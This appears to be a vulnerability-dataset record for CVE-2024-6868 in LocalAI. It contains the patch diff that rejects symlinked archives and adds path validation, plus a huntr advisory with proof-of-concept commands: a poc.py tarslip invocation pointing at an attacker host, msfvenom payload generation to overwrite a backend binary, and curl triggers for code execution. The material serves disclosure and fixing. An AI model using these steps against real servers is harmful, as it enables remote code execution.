{
    "CVE-2024-6868": {
        "published_date": "2024-10-29T12:46:54.732Z",
        "patch_commits": [
            {
                "url": "https://github.com/mudler/localai/commit/a181dd0ebc5d3092fc50f61674d552604fe8ef9c",
                "content": "refactor: gallery inconsistencies (#2647)\n\n* refactor(gallery): move under core/\r\n\r\nSigned-off-by: Ettore Di Giacinto <mudler@localai.io>\r\n\r\n* fix(unarchive): do not allow symlinks\r\n\r\nSigned-off-by: Ettore Di Giacinto <mudler@localai.io>\r\n\r\n---------\r\n\r\nSigned-off-by: Ettore Di Giacinto <mudler@localai.io>\n\nFilename: core/backend/llm.go:\n```\n@@ -12,7 +12,7 @@\nimport (\n \t\"github.com/mudler/LocalAI/core/config\"\n \t\"github.com/mudler/LocalAI/core/schema\"\n \n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n+\t\"github.com/mudler/LocalAI/core/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/grpc\"\n \t\"github.com/mudler/LocalAI/pkg/grpc/proto\"\n \tmodel \"github.com/mudler/LocalAI/pkg/model\"\n```\n\nFilename: core/cli/models.go:\n```\n@@ -5,9 +5,10 @@\nimport (\n \t\"fmt\"\n \n \tcliContext \"github.com/mudler/LocalAI/core/cli/context\"\n+\t\"github.com/mudler/LocalAI/core/config\"\n \n+\t\"github.com/mudler/LocalAI/core/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/downloader\"\n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/startup\"\n \t\"github.com/rs/zerolog/log\"\n \t\"github.com/schollz/progressbar/v3\"\n\n@@ -34,7 +35,7 @@\ntype ModelsCMD struct {\n }\n \n func (ml *ModelsList) Run(ctx *cliContext.Context) error {\n-\tvar galleries []gallery.Gallery\n+\tvar galleries []config.Gallery\n \tif err := json.Unmarshal([]byte(ml.Galleries), &galleries); err != nil {\n \t\tlog.Error().Err(err).Msg(\"unable to load galleries\")\n \t}\n\n@@ -54,7 +55,7 @@\nfunc (ml *ModelsList) Run(ctx *cliContext.Context) error {\n }\n \n func (mi *ModelsInstall) Run(ctx *cliContext.Context) error {\n-\tvar galleries []gallery.Gallery\n+\tvar galleries []config.Gallery\n \tif err := json.Unmarshal([]byte(mi.Galleries), &galleries); err != nil {\n \t\tlog.Error().Err(err).Msg(\"unable to load galleries\")\n \t}\n```\n\nFilename: core/config/application_config.go:\n```\n@@ -6,7 +6,6 @@\nimport (\n \t\"encoding/json\"\n \t\"time\"\n \n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/xsysinfo\"\n \t\"github.com/rs/zerolog/log\"\n )\n\n@@ -36,7 +35,7 @@\ntype ApplicationConfig struct {\n \n \tModelLibraryURL string\n \n-\tGalleries []gallery.Gallery\n+\tGalleries []Gallery\n \n \tBackendAssets     embed.FS\n \tAssetsDestination string\n\n@@ -180,18 +179,18 @@\nfunc WithBackendAssets(f embed.FS) AppOption {\n func WithStringGalleries(galls string) AppOption {\n \treturn func(o *ApplicationConfig) {\n \t\tif galls == \"\" {\n-\t\t\to.Galleries = []gallery.Gallery{}\n+\t\t\to.Galleries = []Gallery{}\n \t\t\treturn\n \t\t}\n-\t\tvar galleries []gallery.Gallery\n+\t\tvar galleries []Gallery\n \t\tif err := json.Unmarshal([]byte(galls), &galleries); err != nil {\n \t\t\tlog.Error().Err(err).Msg(\"failed loading galleries\")\n \t\t}\n \t\to.Galleries = append(o.Galleries, galleries...)\n \t}\n }\n \n-func WithGalleries(galleries []gallery.Gallery) AppOption {\n+func WithGalleries(galleries []Gallery) AppOption {\n \treturn func(o *ApplicationConfig) {\n \t\to.Galleries = append(o.Galleries, galleries...)\n \t}\n```\n\nFilename: core/config/backend_config.go:\n```\n@@ -390,10 +390,6 @@\nfunc (c *BackendConfig) Validate() bool {\n \t\t}\n \t}\n \n-\tif c.Name == \"\" {\n-\t\treturn false\n-\t}\n-\n \tif c.Backend != \"\" {\n \t\t// a regex that checks that is a string name with no special characters, except '-' and '_'\n \t\tre := regexp.MustCompile(`^[a-zA-Z0-9-_]+$`)\n```\n\nFilename: core/config/backend_config_test.go:\n```\n@@ -16,7 +16,8 @@\nvar _ = Describe(\"Test cases for config related functions\", func() {\n \t\t\tExpect(err).To(BeNil())\n \t\t\tdefer os.Remove(tmp.Name())\n \t\t\t_, err = tmp.WriteString(\n-\t\t\t\t`backend: \"foo-bar\"\n+\t\t\t\t`backend: \"../foo-bar\"\n+name: \"foo\"\n parameters:\n   model: \"foo-bar\"`)\n \t\t\tExpect(err).ToNot(HaveOccurred())\n```\n\nFilename: core/config/gallery.go:\n```\n@@ -0,0 +1,6 @@\n+package config\n+\n+type Gallery struct {\n+\tURL  string `json:\"url\" yaml:\"url\"`\n+\tName string `json:\"name\" yaml:\"name\"`\n+}\n```\n\nFilename: core/gallery/gallery.go:\n```\n@@ -8,18 +8,14 @@\nimport (\n \t\"strings\"\n \n \t\"github.com/imdario/mergo\"\n+\t\"github.com/mudler/LocalAI/core/config\"\n \t\"github.com/mudler/LocalAI/pkg/downloader\"\n \t\"github.com/rs/zerolog/log\"\n \t\"gopkg.in/yaml.v2\"\n )\n \n-type Gallery struct {\n-\tURL  string `json:\"url\" yaml:\"url\"`\n-\tName string `json:\"name\" yaml:\"name\"`\n-}\n-\n // Installs a model from the gallery\n-func InstallModelFromGallery(galleries []Gallery, name string, basePath string, req GalleryModel, downloadStatus func(string, string, string, float64)) error {\n+func InstallModelFromGallery(galleries []config.Gallery, name string, basePath string, req GalleryModel, downloadStatus func(string, string, string, float64)) error {\n \n \tapplyModel := func(model *GalleryModel) error {\n \t\tname = strings.ReplaceAll(name, string(os.PathSeparator), \"__\")\n\n@@ -117,7 +113,7 @@\nfunc FindModel(models []*GalleryModel, name string, basePath string) *GalleryMod\n // List available models\n // Models galleries are a list of yaml files that are hosted on a remote server (for example github).\n // Each yaml file contains a list of models that can be downloaded and optionally overrides to define a new model setting.\n-func AvailableGalleryModels(galleries []Gallery, basePath string) ([]*GalleryModel, error) {\n+func AvailableGalleryModels(galleries []config.Gallery, basePath string) ([]*GalleryModel, error) {\n \tvar models []*GalleryModel\n \n \t// Get models from galleries\n\n@@ -146,7 +142,7 @@\nfunc findGalleryURLFromReferenceURL(url string, basePath string) (string, error)\n \treturn refFile, err\n }\n \n-func getGalleryModels(gallery Gallery, basePath string) ([]*GalleryModel, error) {\n+func getGalleryModels(gallery config.Gallery, basePath string) ([]*GalleryModel, error) {\n \tvar models []*GalleryModel = []*GalleryModel{}\n \n \tif strings.HasSuffix(gallery.URL, \".ref\") {\n```\n\nFilename: core/gallery/gallery_suite_test.go:\n```\n\n```\n\nFilename: core/gallery/models.go:\n```\n@@ -6,8 +6,10 @@\nimport (\n \t\"path/filepath\"\n \n \t\"github.com/imdario/mergo\"\n+\tlconfig \"github.com/mudler/LocalAI/core/config\"\n \t\"github.com/mudler/LocalAI/pkg/downloader\"\n \t\"github.com/mudler/LocalAI/pkg/utils\"\n+\n \t\"github.com/rs/zerolog/log\"\n \t\"gopkg.in/yaml.v2\"\n )\n\n@@ -172,6 +174,15 @@\nfunc InstallModel(basePath, nameOverride string, config *Config, configOverrides\n \t\t\treturn fmt.Errorf(\"failed to marshal updated config YAML: %v\", err)\n \t\t}\n \n+\t\tbackendConfig := lconfig.BackendConfig{}\n+\t\terr = yaml.Unmarshal(updatedConfigYAML, &backendConfig)\n+\t\tif err != nil {\n+\t\t\treturn fmt.Errorf(\"failed to unmarshal updated config YAML: %v\", err)\n+\t\t}\n+\t\tif !backendConfig.Validate() {\n+\t\t\treturn fmt.Errorf(\"failed to validate updated config YAML\")\n+\t\t}\n+\n \t\terr = os.WriteFile(configFilePath, updatedConfigYAML, 0600)\n \t\tif err != nil {\n \t\t\treturn fmt.Errorf(\"failed to write updated config file: %v\", err)\n```\n\nFilename: core/gallery/models_test.go:\n```\n@@ -5,7 +5,8 @@\nimport (\n \t\"os\"\n \t\"path/filepath\"\n \n-\t. \"github.com/mudler/LocalAI/pkg/gallery\"\n+\t\"github.com/mudler/LocalAI/core/config\"\n+\t. \"github.com/mudler/LocalAI/core/gallery\"\n \t. \"github.com/onsi/ginkgo/v2\"\n \t. \"github.com/onsi/gomega\"\n \t\"gopkg.in/yaml.v3\"\n\n@@ -54,7 +55,7 @@\nvar _ = Describe(\"Model test\", func() {\n \t\t\terr = os.WriteFile(galleryFilePath, out, 0600)\n \t\t\tExpect(err).ToNot(HaveOccurred())\n \t\t\tExpect(filepath.IsAbs(galleryFilePath)).To(BeTrue(), galleryFilePath)\n-\t\t\tgalleries := []Gallery{\n+\t\t\tgalleries := []config.Gallery{\n \t\t\t\t{\n \t\t\t\t\tName: \"test\",\n \t\t\t\t\tURL:  \"file://\" + galleryFilePath,\n```\n\nFilename: core/gallery/op.go:\n```\n@@ -1,13 +1,15 @@\npackage gallery\r\n \r\n+import \"github.com/mudler/LocalAI/core/config\"\r\n+\r\n type GalleryOp struct {\r\n \tId               string\r\n \tGalleryModelName string\r\n \tConfigURL        string\r\n \tDelete           bool\r\n \r\n \tReq       GalleryModel\r\n-\tGalleries []Gallery\r\n+\tGalleries []config.Gallery\r\n }\r\n \r\n type GalleryOpStatus struct {\n```\n\nFilename: core/gallery/request.go:\n```\n@@ -3,6 +3,8 @@\npackage gallery\n import (\n \t\"fmt\"\n \t\"strings\"\n+\n+\t\"github.com/mudler/LocalAI/core/config\"\n )\n \n // GalleryModel is the struct used to represent a model in the gallery returned by the endpoint.\n\n@@ -23,7 +25,7 @@\ntype GalleryModel struct {\n \t// AdditionalFiles are used to add additional files to the model\n \tAdditionalFiles []File `json:\"files,omitempty\" yaml:\"files,omitempty\"`\n \t// Gallery is a reference to the gallery which contains the model\n-\tGallery Gallery `json:\"gallery,omitempty\" yaml:\"gallery,omitempty\"`\n+\tGallery config.Gallery `json:\"gallery,omitempty\" yaml:\"gallery,omitempty\"`\n \t// Installed is used to indicate if the model is installed or not\n \tInstalled bool `json:\"installed,omitempty\" yaml:\"installed,omitempty\"`\n }\n```\n\nFilename: core/gallery/request_test.go:\n```\n@@ -1,7 +1,7 @@\npackage gallery_test\n \n import (\n-\t. \"github.com/mudler/LocalAI/pkg/gallery\"\n+\t. \"github.com/mudler/LocalAI/core/gallery\"\n \t. \"github.com/onsi/ginkgo/v2\"\n \t. \"github.com/onsi/gomega\"\n )\n```\n\nFilename: core/http/app_test.go:\n```\n@@ -19,8 +19,8 @@\nimport (\n \t\"github.com/mudler/LocalAI/core/startup\"\n \n \t\"github.com/gofiber/fiber/v2\"\n+\t\"github.com/mudler/LocalAI/core/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/downloader\"\n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/model\"\n \t. \"github.com/onsi/ginkgo/v2\"\n \t. \"github.com/onsi/gomega\"\n\n@@ -247,7 +247,7 @@\nvar _ = Describe(\"API test\", func() {\n \t\t\terr = os.WriteFile(filepath.Join(modelDir, \"gallery_simple.yaml\"), out, 0600)\n \t\t\tExpect(err).ToNot(HaveOccurred())\n \n-\t\t\tgalleries := []gallery.Gallery{\n+\t\t\tgalleries := []config.Gallery{\n \t\t\t\t{\n \t\t\t\t\tName: \"test\",\n \t\t\t\t\tURL:  \"file://\" + filepath.Join(modelDir, \"gallery_simple.yaml\"),\n\n@@ -603,7 +603,7 @@\nvar _ = Describe(\"API test\", func() {\n \n \t\t\tc, cancel = context.WithCancel(context.Background())\n \n-\t\t\tgalleries := []gallery.Gallery{\n+\t\t\tgalleries := []config.Gallery{\n \t\t\t\t{\n \t\t\t\t\tName: \"model-gallery\",\n \t\t\t\t\tURL:  \"https://raw.githubusercontent.com/go-skynet/model-gallery/main/index.yaml\",\n```\n\nFilename: core/http/elements/gallery.go:\n```\n@@ -6,8 +6,8 @@\nimport (\n \n \t\"github.com/chasefleming/elem-go\"\n \t\"github.com/chasefleming/elem-go/attrs\"\n+\t\"github.com/mudler/LocalAI/core/gallery\"\n \t\"github.com/mudler/LocalAI/core/services\"\n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/xsync\"\n )\n```\n\nFilename: core/http/endpoints/localai/gallery.go:\n```\n@@ -7,13 +7,14 @@\nimport (\n \r\n \t\"github.com/gofiber/fiber/v2\"\r\n \t\"github.com/google/uuid\"\r\n+\t\"github.com/mudler/LocalAI/core/config\"\r\n+\t\"github.com/mudler/LocalAI/core/gallery\"\r\n \t\"github.com/mudler/LocalAI/core/services\"\r\n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\r\n \t\"github.com/rs/zerolog/log\"\r\n )\r\n \r\n type ModelGalleryEndpointService struct {\r\n-\tgalleries      []gallery.Gallery\r\n+\tgalleries      []config.Gallery\r\n \tmodelPath      string\r\n \tgalleryApplier *services.GalleryService\r\n }\n\n@@ -24,7 +25,7 @@\ntype GalleryModel struct {\n \tgallery.GalleryModel\r\n }\r\n \r\n-func CreateModelGalleryEndpointService(galleries []gallery.Gallery, modelPath string, galleryApplier *services.GalleryService) ModelGalleryEndpointService {\r\n+func CreateModelGalleryEndpointService(galleries []config.Gallery, modelPath string, galleryApplier *services.GalleryService) ModelGalleryEndpointService {\r\n \treturn ModelGalleryEndpointService{\r\n \t\tgalleries:      galleries,\r\n \t\tmodelPath:      modelPath,\n\n@@ -129,12 +130,12 @@\nfunc (mgs *ModelGalleryEndpointService) ListModelGalleriesEndpoint() func(c *fib\n \r\n func (mgs *ModelGalleryEndpointService) AddModelGalleryEndpoint() func(c *fiber.Ctx) error {\r\n \treturn func(c *fiber.Ctx) error {\r\n-\t\tinput := new(gallery.Gallery)\r\n+\t\tinput := new(config.Gallery)\r\n \t\t// Get input data from the request body\r\n \t\tif err := c.BodyParser(input); err != nil {\r\n \t\t\treturn err\r\n \t\t}\r\n-\t\tif slices.ContainsFunc(mgs.galleries, func(gallery gallery.Gallery) bool {\r\n+\t\tif slices.ContainsFunc(mgs.galleries, func(gallery config.Gallery) bool {\r\n \t\t\treturn gallery.Name == input.Name\r\n \t\t}) {\r\n \t\t\treturn fmt.Errorf(\"%s already exists\", input.Name)\n\n@@ -151,17 +152,17 @@\nfunc (mgs *ModelGalleryEndpointService) AddModelGalleryEndpoint() func(c *fiber.\n \r\n func (mgs *ModelGalleryEndpointService) RemoveModelGalleryEndpoint() func(c *fiber.Ctx) error {\r\n \treturn func(c *fiber.Ctx) error {\r\n-\t\tinput := new(gallery.Gallery)\r\n+\t\tinput := new(config.Gallery)\r\n \t\t// Get input data from the request body\r\n \t\tif err := c.BodyParser(input); err != nil {\r\n \t\t\treturn err\r\n \t\t}\r\n-\t\tif !slices.ContainsFunc(mgs.galleries, func(gallery gallery.Gallery) bool {\r\n+\t\tif !slices.ContainsFunc(mgs.galleries, func(gallery config.Gallery) bool {\r\n \t\t\treturn gallery.Name == input.Name\r\n \t\t}) {\r\n \t\t\treturn fmt.Errorf(\"%s is not currently registered\", input.Name)\r\n \t\t}\r\n-\t\tmgs.galleries = slices.DeleteFunc(mgs.galleries, func(gallery gallery.Gallery) bool {\r\n+\t\tmgs.galleries = slices.DeleteFunc(mgs.galleries, func(gallery config.Gallery) bool {\r\n \t\t\treturn gallery.Name == input.Name\r\n \t\t})\r\n \t\treturn c.Send(nil)\n```\n\nFilename: core/http/endpoints/localai/welcome.go:\n```\n@@ -3,8 +3,8 @@\npackage localai\n import (\n \t\"github.com/gofiber/fiber/v2\"\n \t\"github.com/mudler/LocalAI/core/config\"\n+\t\"github.com/mudler/LocalAI/core/gallery\"\n \t\"github.com/mudler/LocalAI/internal\"\n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/model\"\n )\n```\n\nFilename: core/http/endpoints/openai/request.go:\n```\n@@ -257,5 +257,9 @@\nfunc mergeRequestWithConfig(modelFile string, input *schema.OpenAIRequest, cm *c\n \t// Set the parameters for the language model prediction\n \tupdateRequestConfig(cfg, input)\n \n+\tif !cfg.Validate() {\n+\t\treturn nil, nil, fmt.Errorf(\"failed to validate config\")\n+\t}\n+\n \treturn cfg, input, err\n }\n```\n\nFilename: core/http/endpoints/openai/transcription.go:\n```\n@@ -32,7 +32,7 @@\nfunc TranscriptEndpoint(cl *config.BackendConfigLoader, ml *model.ModelLoader, a\n \n \t\tconfig, input, err := mergeRequestWithConfig(m, input, cl, ml, appConfig.Debug, appConfig.Threads, appConfig.ContextSize, appConfig.F16)\n \t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"failed reading parameters from request:%w\", err)\n+\t\t\treturn fmt.Errorf(\"failed reading parameters from request: %w\", err)\n \t\t}\n \t\t// retrieve the file data from the request\n \t\tfile, err := c.FormFile(\"file\")\n```\n\nFilename: core/http/routes/ui.go:\n```\n@@ -7,11 +7,11 @@\nimport (\n \t\"strings\"\n \n \t\"github.com/mudler/LocalAI/core/config\"\n+\t\"github.com/mudler/LocalAI/core/gallery\"\n \t\"github.com/mudler/LocalAI/core/http/elements\"\n \t\"github.com/mudler/LocalAI/core/http/endpoints/localai\"\n \t\"github.com/mudler/LocalAI/core/services\"\n \t\"github.com/mudler/LocalAI/internal\"\n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/model\"\n \t\"github.com/mudler/LocalAI/pkg/xsync\"\n \t\"github.com/rs/zerolog/log\"\n```\n\nFilename: core/services/gallery.go:\n```\n@@ -9,7 +9,7 @@\nimport (\n \t\"sync\"\r\n \r\n \t\"github.com/mudler/LocalAI/core/config\"\r\n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\r\n+\t\"github.com/mudler/LocalAI/core/gallery\"\r\n \t\"github.com/mudler/LocalAI/pkg/startup\"\r\n \t\"github.com/mudler/LocalAI/pkg/utils\"\r\n \t\"gopkg.in/yaml.v2\"\n\n@@ -96,6 +96,7 @@\nfunc (g *GalleryService) Start(c context.Context, cl *config.BackendConfigLoader\n \t\t\t\t// delete a model\r\n \t\t\t\tif op.Delete {\r\n \t\t\t\t\tmodelConfig := &config.BackendConfig{}\r\n+\r\n \t\t\t\t\t// Galleryname is the name of the model in this case\r\n \t\t\t\t\tdat, err := os.ReadFile(filepath.Join(g.appConfig.ModelPath, op.GalleryModelName+\".yaml\"))\r\n \t\t\t\t\tif err != nil {\n\n@@ -174,7 +175,7 @@\ntype galleryModel struct {\n \tID                   string           `json:\"id\"`\r\n }\r\n \r\n-func processRequests(modelPath string, galleries []gallery.Gallery, requests []galleryModel) error {\r\n+func processRequests(modelPath string, galleries []config.Gallery, requests []galleryModel) error {\r\n \tvar err error\r\n \tfor _, r := range requests {\r\n \t\tutils.ResetDownloadTimers()\n\n@@ -189,7 +190,7 @@\nfunc processRequests(modelPath string, galleries []gallery.Gallery, requests []g\n \treturn err\r\n }\r\n \r\n-func ApplyGalleryFromFile(modelPath, s string, galleries []gallery.Gallery) error {\r\n+func ApplyGalleryFromFile(modelPath, s string, galleries []config.Gallery) error {\r\n \tdat, err := os.ReadFile(s)\r\n \tif err != nil {\r\n \t\treturn err\n\n@@ -203,7 +204,7 @@\nfunc ApplyGalleryFromFile(modelPath, s string, galleries []gallery.Gallery) erro\n \treturn processRequests(modelPath, galleries, requests)\r\n }\r\n \r\n-func ApplyGalleryFromString(modelPath, s string, galleries []gallery.Gallery) error {\r\n+func ApplyGalleryFromString(modelPath, s string, galleries []config.Gallery) error {\r\n \tvar requests []galleryModel\r\n \terr := json.Unmarshal([]byte(s), &requests)\r\n \tif err != nil {\n```\n\nFilename: pkg/model/initializers.go:\n```\n@@ -13,6 +13,7 @@\nimport (\n \t\"github.com/klauspost/cpuid/v2\"\n \tgrpc \"github.com/mudler/LocalAI/pkg/grpc\"\n \t\"github.com/mudler/LocalAI/pkg/library\"\n+\t\"github.com/mudler/LocalAI/pkg/utils\"\n \t\"github.com/mudler/LocalAI/pkg/xsysinfo\"\n \t\"github.com/phayes/freeport\"\n \t\"github.com/rs/zerolog/log\"\n\n@@ -309,6 +310,9 @@\nfunc (ml *ModelLoader) grpcModel(backend string, o *Options) func(string, string\n \t\t\t}\n \t\t} else {\n \t\t\tgrpcProcess := backendPath(o.assetDir, backend)\n+\t\t\tif err := utils.VerifyPath(grpcProcess, o.assetDir); err != nil {\n+\t\t\t\treturn \"\", fmt.Errorf(\"grpc process not found in assetdir: %s\", err.Error())\n+\t\t\t}\n \n \t\t\tif autoDetect {\n \t\t\t\t// autoDetect GRPC process to start based on system capabilities\n```\n\nFilename: pkg/startup/model_preload.go:\n```\n@@ -7,17 +7,18 @@\nimport (\n \t\"path/filepath\"\n \t\"strings\"\n \n+\t\"github.com/mudler/LocalAI/core/config\"\n+\t\"github.com/mudler/LocalAI/core/gallery\"\n \t\"github.com/mudler/LocalAI/embedded\"\n \t\"github.com/mudler/LocalAI/pkg/downloader\"\n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n \t\"github.com/mudler/LocalAI/pkg/utils\"\n \t\"github.com/rs/zerolog/log\"\n )\n \n // InstallModels will preload models from the given list of URLs and galleries\n // It will download the model if it is not already present in the model path\n // It will also try to resolve if the model is an embedded model YAML configuration\n-func InstallModels(galleries []gallery.Gallery, modelLibraryURL string, modelPath string, downloadStatus func(string, string, string, float64), models ...string) error {\n+func InstallModels(galleries []config.Gallery, modelLibraryURL string, modelPath string, downloadStatus func(string, string, string, float64), models ...string) error {\n \t// create an error that groups all errors\n \tvar err error\n\n@@ -126,7 +127,7 @@\nfunc InstallModels(galleries []gallery.Gallery, modelLibraryURL string, modelPat\n \treturn err\n }\n \n-func installModel(galleries []gallery.Gallery, modelName, modelPath string, downloadStatus func(string, string, string, float64)) (error, bool) {\n+func installModel(galleries []config.Gallery, modelName, modelPath string, downloadStatus func(string, string, string, float64)) (error, bool) {\n \tmodels, err := gallery.AvailableGalleryModels(galleries, modelPath)\n \tif err != nil {\n \t\treturn err, false\n```\n\nFilename: pkg/startup/model_preload_test.go:\n```\n@@ -5,7 +5,7 @@\nimport (\n \t\"os\"\n \t\"path/filepath\"\n \n-\t\"github.com/mudler/LocalAI/pkg/gallery\"\n+\t\"github.com/mudler/LocalAI/core/config\"\n \t. \"github.com/mudler/LocalAI/pkg/startup\"\n \t\"github.com/mudler/LocalAI/pkg/utils\"\n\n@@ -22,7 +22,7 @@\nvar _ = Describe(\"Preload test\", func() {\n \t\t\tlibraryURL := \"https://raw.githubusercontent.com/mudler/LocalAI/master/embedded/model_library.yaml\"\n \t\t\tfileName := fmt.Sprintf(\"%s.yaml\", \"1701d57f28d47552516c2b6ecc3cc719\")\n \n-\t\t\tInstallModels([]gallery.Gallery{}, libraryURL, tmpdir, nil, \"phi-2\")\n+\t\t\tInstallModels([]config.Gallery{}, libraryURL, tmpdir, nil, \"phi-2\")\n \n \t\t\tresultFile := filepath.Join(tmpdir, fileName)\n\n@@ -38,7 +38,7 @@\nvar _ = Describe(\"Preload test\", func() {\n \t\t\turl := \"https://raw.githubusercontent.com/mudler/LocalAI/master/examples/configurations/phi-2.yaml\"\n \t\t\tfileName := fmt.Sprintf(\"%s.yaml\", utils.MD5(url))\n \n-\t\t\tInstallModels([]gallery.Gallery{}, \"\", tmpdir, nil, url)\n+\t\t\tInstallModels([]config.Gallery{}, \"\", tmpdir, nil, url)\n \n \t\t\tresultFile := filepath.Join(tmpdir, fileName)\n\n@@ -52,7 +52,7 @@\nvar _ = Describe(\"Preload test\", func() {\n \t\t\tExpect(err).ToNot(HaveOccurred())\n \t\t\turl := \"phi-2\"\n \n-\t\t\tInstallModels([]gallery.Gallery{}, \"\", tmpdir, nil, url)\n+\t\t\tInstallModels([]config.Gallery{}, \"\", tmpdir, nil, url)\n \n \t\t\tentry, err := os.ReadDir(tmpdir)\n \t\t\tExpect(err).ToNot(HaveOccurred())\n\n@@ -70,7 +70,7 @@\nvar _ = Describe(\"Preload test\", func() {\n \t\t\turl := \"mistral-openorca\"\n \t\t\tfileName := fmt.Sprintf(\"%s.yaml\", utils.MD5(url))\n \n-\t\t\tInstallModels([]gallery.Gallery{}, \"\", tmpdir, nil, url)\n+\t\t\tInstallModels([]config.Gallery{}, \"\", tmpdir, nil, url)\n \n \t\t\tresultFile := filepath.Join(tmpdir, fileName)\n```\n\nFilename: pkg/utils/untar.go:\n```\n@@ -2,6 +2,7 @@\npackage utils\n \n import (\n \t\"fmt\"\n+\t\"os\"\n \n \t\"github.com/mholt/archiver/v3\"\n )\n\n@@ -52,5 +53,17 @@\nfunc ExtractArchive(archive, dst string) error {\n \tcase *archiver.TarZstd:\n \t\tv.Tar = mytar\n \t}\n+\n+\terr = archiver.Walk(archive, func(f archiver.File) error {\n+\t\tif f.FileInfo.Mode()&os.ModeSymlink != 0 {\n+\t\t\treturn fmt.Errorf(\"archive contains a symlink\")\n+\t\t}\n+\t\treturn nil\n+\t})\n+\n+\tif err != nil {\n+\t\treturn err\n+\t}\n+\n \treturn un.Unarchive(archive, dst)\n }\n```"
            }
        ],
        "sw_version": "v2.18.0",
        "sw_version_wget": "https://github.com/mudler/localai/archive/refs/tags/v2.18.0.zip",
        "description": "mudler/LocalAI version 2.17.1 allows for arbitrary file write due to improper handling of automatic archive extraction. When model configurations specify additional files as archives (e.g., .tar), these archives are automatically extracted after downloading. This behavior can be exploited to perform a 'tarslip' attack, allowing files to be written to arbitrary locations on the server, bypassing checks that normally restrict files to the models directory. This vulnerability can lead to remote code execution (RCE) by overwriting backend assets used by the server.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/752d2376-2d9a-4e17-b462-3c267f9dd229",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\narbitrary file write by abusing automatic archive extraction in mudler/localai\nValid\nReported on Jun 20th 2024\nDescription\nModel configuration allows to specify additional files that are used by the model. If these files are archives (like .tar) they will be automatically extracted after downloading them. This allows to do a \"tarslip\" and write files to arbitrary location bypassing any checks that otherwise keep everything in the models directory: https://github.com/mudler/LocalAI/blob/d3137775a1e02c093ecf3e14a15f1c39eca9d429/pkg/downloader/uri.go#L251\nBecause the file is extracted from .tar archive, it's attributes (like x) will be preserved. localai process copies backend assets to\ndocker exec -it local-ai-poc ls -lah /tmp/localai/backend_data/backend-assets/grpc\ntotal 366M\ndrwxr-x--- 2 root root 4.0K Jun 20 18:34 .\ndrwxr-x--- 6 root root 4.0K Jun 20 18:34 ..\n-rwx------ 1 root root  15M Jun 20 18:34 bert-embeddings\n-rwx------ 1 root root  14M Jun 20 18:34 gpt4all\n-rwx------ 1 root root  16M Jun 20 18:34 huggingface\n-rwx------ 1 root root  57M Jun 20 18:34 llama-cpp-avx\n-rwx------ 1 root root  57M Jun 20 18:34 llama-cpp-avx2\n-rwx------ 1 root root  57M Jun 20 18:34 llama-cpp-fallback\n-rwx------ 1 root root  58M Jun 20 18:34 llama-cpp-grpc\n-rwx------ 1 root root  15M Jun 20 18:34 llama-ggml\n-rwx------ 1 root root  14M Jun 20 18:34 local-store\n-rwx------ 1 root root  16M Jun 20 18:34 piper\n-rwx------ 1 root root  14M Jun 20 18:34 rwkv\n-rwx------ 1 root root  24M Jun 20 18:34 stablediffusion\n-rwx------ 1 root root  15M Jun 20 18:34 whisper\non startup and they are in general writable by the server. Overwriting one of those files and running a model that uses a corresponding backend will then lead to an easy RCE.\nIt is probably a good idea to only allow regular files and directories in the archives, or otherwise make sure that the files are not extracted outside of models directory. I think that legitimate model packages are built with Windows in mind so the files they use shouldn't have any symlinks there in the first place. I combed through the model configs in https://raw.githubusercontent.com/mudler/LocalAI/master/gallery/index.yaml and the only archives there are voice files for piper with a few files in them. So I think it should be enough to add\n  // ...\n    err := archiver.Walk(archive, func(f archiver.File) error {\n        if f.FileInfo.Mode() & os.ModeSymlink != 0 {\n            return fmt.Errorf(\"archive contains a symlink\")\n        }\n        return nil\n    })\n\n    if err != nil {\n        return err\n    }\n  // ...\neither at the beginning of func ExtractArchive(..) in pkg/utils/untar.go or to func DownloadFile(..) in pkg/downloader/uri.go (after archive is detected) to flat out refuse to extract an archive if there are symlinks in them.\nProof of Concept\n# this is the smallest localai image that doesn't download gigabytes of model files,\n# another options is to clone the repo, `make build` and then run locally:\n$ docker run --rm -ti --name local-ai-poc -p 8080:8080 localai/localai:v2.17.1-ffmpeg-core\n...\n6:34PM INF Starting LocalAI using 6 threads, with models path: /build/models\n6:34PM INF LocalAI version: v2.17.1 (8142bdc48f3619eddc6344fa4ed83b331f7b37c2)\n...\n\n$ echo 'poc' > poc.txt\n$ python poc.py --url='http://localhost:8080' --lhost='172.17.0.1' --remote_path='/root/poc.txt' --local_path='poc.txt'\n...\n\n$ docker exec -it local-ai-poc cat /root/poc.txt\npoc\n\n# for RCE:\n$ msfvenom -p linux/x64/exec CMD='touch /tmp/touched_by_rce' -f elf-so > pwn\n$ chmod +x pwn\n# overwrite whisper backend:\n$ python poc.py --url='http://localhost:8080' --lhost='172.17.0.1' --remote_path='/tmp/localai/backend_data/backend-assets/grpc/whisper' --local_path='pwn'\n# download a sample .ogg file and load whisper model (it's  ~50mb, so wait a minute until download is\n# finished)\n$ curl https://upload.wikimedia.org/wikipedia/commons/1/1f/George_W_Bush_Columbia_FINAL.ogg -o test.ogg\n$ curl http://localhost:8080/models/apply -H 'Content-Type: application/json' -d '{\"id\":\"whisper-base-en-q5_1\"}'\n$ curl http://localhost:8080/v1/audio/transcriptions -H 'Content-Type: multipart/form-data' -F file='@test.ogg' -F model='whisper-base-en-q5_1'\n$ docker exec -it local-ai-poc ls -la /tmp/touched_by_rce\n-rw-r--r-- 1 root root 0 Jun 20 19:42 /tmp/touched_by_rce\nimport json, time, tarfile\n\nfrom io import BytesIO\nfrom random import 